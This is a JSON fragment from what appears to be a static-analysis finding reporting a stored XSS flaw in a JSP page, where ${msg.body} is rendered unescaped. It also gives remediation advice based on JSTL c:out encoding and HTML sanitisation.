          "properties": {
            "impact": 4.8,
            "likelihood": 4.8,
            "snippetStartLine": 27,
            "summary": "Stored XSS: unescaped EL expression ${msg.body} renders attacker-controlled message body directly into HTML, enabling arbitrary script execution",
            "remediationSummary": "Replace ${msg.body} with &lt;c:out value=\"${msg.body}\"/&gt; to HTML-encode user-supplied message body content before rendering, preventing stored XSS.",
            "remediation": "If the body is intended as plain text, replace the EL expression with a JSTL output tag:\n\n```jsp\n<div class=\"content\">\n    <c:out value=\"${msg.body}\"/>\n</div>\n```\n\nIf formatted (rich-text) content must be supported, use a well-maintained HTML sanitisation library (e.g., OWASP Java HTML Sanitizer) to strip unsafe tags and attributes **before** storing the content in the database, and additionally encode at render time.\n\nUnder no circumstances should raw, un-sanitised, un-encoded HTML from user input be passed to the browser."
          }
